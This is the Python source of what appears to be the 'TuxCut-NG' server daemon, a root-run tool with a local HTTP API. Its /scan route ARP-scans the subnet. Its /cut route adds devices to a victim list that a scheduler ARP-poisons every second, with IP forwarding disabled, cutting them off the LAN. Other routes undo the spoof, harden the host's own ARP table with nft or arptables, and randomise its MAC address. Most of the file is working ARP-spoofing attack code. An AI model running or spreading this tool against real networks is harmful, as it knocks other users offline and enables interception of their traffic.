#!/usr/bin/env python3
"""TuxCut-NG v1.3.1 — Server daemon (run as root via systemd)"""

import sys, os, json, atexit, re, socket, subprocess, random, logging
from pathlib import Path
from setproctitle import setproctitle
from bottle import route, run, request, response
from apscheduler.schedulers.background import BackgroundScheduler
from apscheduler.triggers.interval import IntervalTrigger
from scapy.all import ARP, Ether, srp, send, get_if_addr, get_if_hwaddr, arping

setproctitle('tuxcut-server')

# ── Logging ───────────────────────────────────────────────────────────
Path('/var/log/tuxcut').mkdir(exist_ok=True)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('tuxcut-server')
fh = logging.FileHandler('/var/log/tuxcut/tuxcut.log')
fh.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(fh)

victims = []

# ── Network helpers ───────────────────────────────────────────────────

def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ''

def get_default_gw():
    out = subprocess.run(['ip', 'route', 'show', 'default'],
                         capture_output=True, text=True).stdout
    m = re.search(r'default via (\S+) dev (\S+)', out)
    if not m:
        return {}
    gw_ip, iface = m.group(1), m.group(2)
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=gw_ip),
                 timeout=3, verbose=False)
    gw_mac = ans[0][1].hwsrc if ans else ''
    return {'ip': gw_ip, 'mac': gw_mac, 'iface': iface,
            'hostname': get_hostname(gw_ip)}

def get_my(iface):
    return {'ip':       get_if_addr(iface),
            'mac':      get_if_hwaddr(iface),
            'hostname': get_hostname(get_if_addr(iface))}

def enable_ip_forward():
    subprocess.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=1'])

def disable_ip_forward():
    subprocess.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=0'])

def arp_spoof(victim):
    gw = get_default_gw()
    my = get_my(gw['iface'])
    send(ARP(op=2, psrc=gw['ip'],     hwsrc=my['mac'],
             pdst=victim['ip'],        hwdst=victim['mac']),
         count=5, verbose=False)
    send(ARP(op=2, psrc=victim['ip'], hwsrc=my['mac'],
             pdst=gw['ip'],           hwdst=gw['mac']),
         count=5, verbose=False)

def arp_unspoof(victim):
    gw = get_default_gw()
    send(ARP(op=2, psrc=gw['ip'],     hwsrc=gw['mac'],
             pdst=victim['ip'],        hwdst=victim['mac']),
         count=10, verbose=False)
    send(ARP(op=2, psrc=victim['ip'], hwsrc=victim['mac'],
             pdst=gw['ip'],           hwdst=gw['mac']),
         count=10, verbose=False)

def generate_mac():
    return ':'.join('%02x' % b for b in [
        0x00, random.randint(0, 0x7f), random.randint(0, 0x7f),
        random.randint(0, 0x7f), random.randint(0, 0xff), random.randint(0, 0xff)])

# ── Scheduler ─────────────────────────────────────────────────────────

def attack_victims():
    if victims:
        disable_ip_forward()
        for v in victims:
            try:
                arp_spoof(v)
            except Exception:
                pass

scheduler = BackgroundScheduler()
scheduler.start()
scheduler.add_job(attack_victims, IntervalTrigger(seconds=1),
                  id='arp_attack_job', replace_existing=True)

@atexit.register
def on_exit():
    enable_ip_forward()
    scheduler.shutdown()
    logger.info('TuxCut server stopped')

# ── Routes ────────────────────────────────────────────────────────────

def json_response(data):
    response.content_type = 'application/json'
    return json.dumps(data)

@route('/status')
def status():
    return json_response({'status': 'success', 'msg': 'TuxCut server is running'})

@route('/gw')
def gw():
    g = get_default_gw()
    if g:
        return json_response({'status': 'success', 'gw': g})
    return json_response({'status': 'error', 'msg': 'No gateway found'})

@route('/my/<iface>')
def my(iface):
    return json_response({'status': 'success', 'my': get_my(iface)})

@route('/scan/<gw_ip>')
def scan(gw_ip):
    hosts = []
    ans, _ = arping(f'{gw_ip}/24', verbose=False)
    for _, r in ans:
        hosts.append({'ip': r.psrc, 'mac': r.hwsrc,
                      'hostname': get_hostname(r.psrc)})
    return json_response({'result': {'status': 'success', 'hosts': hosts}})

@route('/cut', method='POST')
def cut():
    v = request.json
    if v and v not in victims:
        victims.append(v)
    return json_response({'status': 'success', 'msg': 'victim added'})

@route('/resume', method='POST')
def resume():
    v = request.json
    if v in victims:
        victims.remove(v)
    try:
        arp_unspoof(v)
    except Exception:
        pass
    return json_response({'status': 'success', 'msg': 'victim resumed'})

@route('/protect', method='POST')
def protect():
    gw_ip  = request.forms.get('ip', '')
    gw_mac = request.forms.get('mac', '')
    iface  = request.forms.get('iface', '')
    if subprocess.run(['which', 'nft'], capture_output=True).returncode == 0:
        subprocess.run(['nft', 'delete', 'table', 'arp', 'tuxcut'], capture_output=True)
        nft = (f'table arp tuxcut {{\n  chain input {{\n'
               f'    type filter hook input priority 0; policy drop;\n'
               f'    arp saddr ip {gw_ip} arp saddr ether {gw_mac} accept\n'
               f'  }}\n}}')
        subprocess.run(['nft', '-f', '-'], input=nft.encode(), capture_output=True)
    else:
        for cmd in [['arptables', '-F'],
                    ['arptables', '-P', 'INPUT', 'DROP'],
                    ['arptables', '-P', 'OUTPUT', 'DROP'],
                    ['arptables', '-A', 'INPUT', '-s', gw_ip,
                     '--source-mac', gw_mac, '-j', 'ACCEPT'],
                    ['arptables', '-A', 'OUTPUT', '-d', gw_ip,
                     '--destination-mac', gw_mac, '-j', 'ACCEPT']]:
            subprocess.Popen(cmd)
    if iface:
        subprocess.run(['ip', 'neigh', 'replace', gw_ip, 'lladdr', gw_mac,
                        'dev', iface, 'nud', 'permanent'], capture_output=True)
    return json_response({'status': 'success', 'msg': 'Protection Enabled'})

@route('/unprotect')
def unprotect():
    if subprocess.run(['which', 'nft'], capture_output=True).returncode == 0:
        subprocess.run(['nft', 'delete', 'table', 'arp', 'tuxcut'], capture_output=True)
    else:
        for cmd in [['arptables', '-P', 'INPUT', 'ACCEPT'],
                    ['arptables', '-P', 'OUTPUT', 'ACCEPT'],
                    ['arptables', '-F']]:
            subprocess.Popen(cmd)
    return json_response({'status': 'success', 'msg': 'Protection Disabled'})

@route('/change-mac/<iface>')
def change_mac(iface):
    new_mac = generate_mac()
    try:
        subprocess.run(['ip', 'link', 'set', iface, 'down'])
        subprocess.run(['ip', 'link', 'set', iface, 'address', new_mac])
        subprocess.run(['ip', 'link', 'set', iface, 'up'])
        return json_response({'result': {'status': 'success', 'new_mac': new_mac}})
    except Exception:
        return json_response({'result': {'status': 'failed'}})

# ── Start ──────────────────────────────────────────────────────────────

if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit('ERROR: must run as root')
    subprocess.run(['fuser', '-k', '8013/tcp'], capture_output=True)
    logger.info('TuxCut-NG v1.3.1 starting on 127.0.0.1:8013')
    run(host='127.0.0.1', port=8013, quiet=True, server='wsgiref')
